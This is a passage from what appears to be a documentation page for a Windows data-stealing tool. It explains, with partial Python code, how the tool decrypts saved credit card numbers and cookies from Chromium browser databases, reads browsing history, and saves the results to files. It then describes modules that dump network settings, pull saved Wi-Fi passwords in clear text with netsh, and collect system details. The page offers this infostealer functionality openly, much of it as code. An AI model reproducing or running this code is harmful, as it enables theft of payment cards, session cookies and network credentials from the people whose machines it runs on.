style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">__decrypt_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">except</span><span class="token plain"> Exception </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">merror</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">profile</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [cards] Error in decrypting the Card Number for </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">3</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            card_number </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;Error. Check the log&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;&quot;&quot;\nName On Card: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nCard Number: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">card_number</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nExpires On:  </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> / </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nAdded On: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">datetime</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">fromtimestamp</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">4</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> Constant</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">seperator</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (closing database connection)</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="333-__get_cookies">3.3.3 <code>__get_cookies</code><a href="#333-__get_cookies" class="hash-link" aria-label="Direct link to 333-__get_cookies" title="Direct link to 333-__get_cookies">​</a></h5><p>This function retrieves cookies (host key, cookie name, decrypted cookie value, expiration date) from the browser&#x27;s Cookies database.</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__get_cookies</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> profile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bytes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (previously explained)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> row </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> cursor</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fetchall</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">or</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">try</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            cookie </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">__decrypt_password</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">row</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> master_key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">except</span><span class="token plain"> Exception </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">merror</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;[</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">browser_name</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">profile</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">] [cookies] Error in decrypting the cookies for </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">3</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> -&gt; </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            cookie </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;Error. Check the log&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;&quot;&quot;\nHost Key : </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">0</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nCookie Name : </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">1</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nPath: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nCookie: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">cookie</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">\nExpires On: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">row</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string-interpolation interpolation number" style="color:hsl(35, 99%, 36%)">4</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> Constant</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">seperator</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (closing database connection)</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="334-__get_web_history">3.3.4 <code>__get_web_history</code><a href="#334-__get_web_history" class="hash-link" aria-label="Direct link to 334-__get_web_history" title="Direct link to 334-__get_web_history">​</a></h5><p>This function retrieves web history (URL, title, last visit time) from the browser&#x27;s History database (commented out by default due to potential slowness).</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__get_web_history</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> profile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (previously explained)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> result</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="34-results-handling">3.4 Results Handling<a href="#34-results-handling" class="hash-link" aria-label="Direct link to 3.4 Results Handling" title="Direct link to 3.4 Results Handling">​</a></h5><p>After data retrieval, the script handles the results by saving them into text files organized by browser type, profile, and data type (login, cookies, etc.).</p><div class="language-python codeBlockContainer_APcc theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_m3Ux"><pre tabindex="0" class="prism-code language-python codeBlock_qGQc thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_p187"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">save_results</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> browser_name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> data_type</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> content</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> profile</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ... (previously explained)</span><br></span></code></pre><div class="buttonGroup_6DOT"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_FhaS" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_phi_"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_FfTR"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This function creates folders to organize the saved information and writes the content to text files.</p><h5 class="anchor anchorWithStickyNavbar_lQ1M" id="35-execution">3.5 Execution<a href="#35-execution" class="hash-link" aria-label="Direct link to 3.5 Execution" title="Direct link to 3.5 Execution">​</a></h5><p>The script, when executed, goes through the process of recovering data from Chromium-based browsers by calling these functions appropriately for each browser and profile.</p><p>This concludes the detailed explanation of the information extraction part of the script.</p><p></p></div></div></details>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesnetworknetworkpy"><code>./modules/network/network.py</code><a href="#modulesnetworknetworkpy" class="hash-link" aria-label="Direct link to modulesnetworknetworkpy" title="Direct link to modulesnetworknetworkpy">​</a></h3>
<ul>
<li>runs the <code>ipconfig /all</code> command. it provides detailed information about the network interfaces and their config</li>
<li>runs the <code>get-wmiobject Win32_NetworkAdapterConfiguration</code> command in powershell, to get information about network adapter configs.</li>
<li>runs the <code>Get-NetAdapter -physical| where status -eq &#x27;up&#x27;</code> command in powershell, listing physical network adapters with an a status of &#x27;up&#x27;</li>
<li>runs the <code>powershell Get-NetIPConfiguration -All</code> command in powershell, to gather detailed IP configuration information</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulesnetworkwifi_passwordspy"><code>./modules/network/wifi_passwords.py</code><a href="#modulesnetworkwifi_passwordspy" class="hash-link" aria-label="Direct link to modulesnetworkwifi_passwordspy" title="Direct link to modulesnetworkwifi_passwordspy">​</a></h3>
<ul>
<li>runs <code>netsh wlan show profiles</code> to get a list of all Wi-Fi connected wifi networks.</li>
<li>extract wifi names / SSIDs</li>
<li>iterated over each wifi name:<!-- -->
<ul>
<li>Runs <code>netsh wlan show profile &lt;profile_name&gt; key=clear</code> to get detailed information about that network, with the wifi password in plain text</li>
<li>extract it and save it</li>
</ul>
</li>
<li>note that this only works with windows installations with their languages set to English or French</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_lQ1M" id="modulessysteminfosystempy"><code>./modules/systeminfo/system.py</code><a href="#modulessysteminfosystempy" class="hash-link" aria-label="Direct link to modulessysteminfosystempy" title="Direct link to modulessysteminfosystempy">​</a></h3>
<ul>
<li>the <code>systeminfo()</code> function runs the <code>systeminfo</code> command and saves it output accordingly</li>
<li>the <code>computerinfo()</code> function runs the <code>Get-ComputerInfo</code> command and saves it output accordingly</li>
<li>the <code>motherboard()</code> function runs the <code>Get-WmiObject win32_baseboard</code> command and saves it output accordingly</li>
<li>the <code>cpu()</code> function runs the <code>Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property [a-z]*</code> command and saves it output accordingly</li>
<li>the <code>sound()</code> function runs the <code>Get-CimInstance win32_sounddevice | fl *</code> command and saves it output accordingly</li>
